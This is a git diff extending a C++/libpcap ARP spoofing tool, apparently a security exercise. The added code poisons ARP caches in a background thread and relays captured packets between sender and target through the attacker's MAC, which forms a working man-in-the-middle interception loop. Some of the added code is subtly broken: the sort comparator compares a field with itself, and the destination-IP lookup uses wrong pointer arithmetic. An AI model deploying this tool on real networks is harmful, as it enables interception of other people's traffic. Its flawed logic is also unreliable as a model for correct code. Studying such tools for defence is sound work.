@@ -10,6 +10,7 @@
 #include <thread>
 #include <vector>
 #include <iostream>
+#include <algorithm>
 #pragma pack(push, 1)
 struct EthArpPacket final {
 	EthHdr eth_;
@@ -22,6 +23,11 @@ typedef struct flowset {
 	Ip target_ipaddr;
 	Mac target_macaddr;
 }flowset;
+
+bool operator < (flowset flow_a, flowset flow_b) {
+	if(flow_a.sender_macaddr < flow_b.sender_macaddr) return flow_a.target_macaddr < flow_b.target_macaddr;
+	else return flow_a.sender_macaddr < flow_a.sender_macaddr;
+}
 
 #pragma pack(pop)
 
@@ -150,7 +156,7 @@ int arp_infect(pcap_t* handle) {
 	return 0;
 }
 
-int arp_relay(pcap_t* handle, Mac target_macaddr, const u_char* packet) {
+int arp_relay(pcap_t* handle, const u_char* packet, Mac target_macaddr) {
 	EthArpPacket* receiver_packet = (EthArpPacket*) packet;
 	receiver_packet->eth_.smac_ = attacker_macaddr;
 	receiver_packet->eth_.dmac_ = target_macaddr;
@@ -168,6 +174,7 @@ int main(int argc, char* argv[]) {
 		return -1;
 	}
 
+	int res;
 	char* dev = argv[1];
 	char errbuf[PCAP_ERRBUF_SIZE];
 	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
@@ -177,7 +184,7 @@ int main(int argc, char* argv[]) {
 	}
 
 	if (attacker_info(dev) < 0) {
-		fprintf(stderr, "failed to get attacker's info!\n", dev, errbuf);
+		fprintf(stderr, "failed to get attacker's info!\n");
 		return -1;
 	}
 
@@ -186,7 +193,7 @@ int main(int argc, char* argv[]) {
 		Ip sender_ipaddr = Ip(argv[2*i+2]);
 		Ip target_ipaddr = Ip(argv[2*i+3]);
 		flowset flowstate;
-		int res = flow_init(dev, sender_ipaddr, target_ipaddr, &flowstate);
+		res = flow_init(dev, sender_ipaddr, target_ipaddr, &flowstate);
 		if (res == -1) {
 			printf("failed to get sender and target's info!\n");
 			break;
@@ -194,6 +201,51 @@ int main(int argc, char* argv[]) {
 		flow.push_back(flowstate);
 		printf("sender ip : %s, sender mac : %s\n", string(flowstate.sender_ipaddr), string(flowstate.sender_macaddr));
 		printf("target ip : %s, target mac : %s\n", string(flowstate.target_ipaddr), string(flowstate.target_macaddr));
+	}
+
+	sort(flow.begin(), flow.end());
+	thread arp_infect_thread(arp_infect, handle);
+	struct pcap_pkthdr* header;
+	const u_char* packet;
+	EthArpPacket* receiver_packet;
+
+	while(true) {
+		res = pcap_next_ex(handle, &header, &packet);
+		if(res == 0) continue;
+		if(res < 0) {
+			fprintf(stderr, "pcap_next_ex return %d error=%s)\n", res, pcap_geterr(handle));
+			return -1;
+		}
+		receiver_packet = (EthArpPacket*)packet;
+		flowset tmp;
+		if(receiver_packet -> eth_.type() == EthHdr::Arp) {
+			tmp.sender_macaddr = receiver_packet->arp_.smac_;
+			auto it = lower_bound(flow.begin(), flow.end(), tmp);
+			for(; it != flow.end(); it++) {
+				flowset pktflow = *it;
+				if(pktflow.sender_macaddr != receiver_packet -> arp_.smac_) break;
+				res = pcap_sendpacket(handle, reinterpret_cast<u_char*>(&pktflow.infect_pkt), sizeof(EthArpPacket));
+				if(res != 0) {
+					fprintf(stderr, "pcap_sendpacket return %d error = %s)\n", res, pcap_geterr(handle));
+					return -1;
+				}
+			}
+		}
+		else { //Ip4
+			tmp.sender_macaddr = receiver_packet->eth_.smac_;
+			Ip dip = Ip(ntohl(*((uint32_t*)(receiver_packet + sizeof(EthHdr) + 16))));
+			auto it = lower_bound(flow.begin(), flow.end(), tmp);
+			for(; it != flow.end(); it++) {
+				flowset pktflow = *it;
+				if(pktflow.sender_macaddr != receiver_packet -> eth_.smac_) break;
+				else if (receiver_packet->eth_.dmac_ != attacker_macaddr || dip != pktflow.target_ipaddr) continue;
+				res = arp_relay(handle, packet, pktflow.target_macaddr);
+				if (res != 0) {
+					printf("arp_relay failed\n");
+					return -1;
+				}
+			}
+		}
 	}
 	pcap_close(handle);
 	return 0;
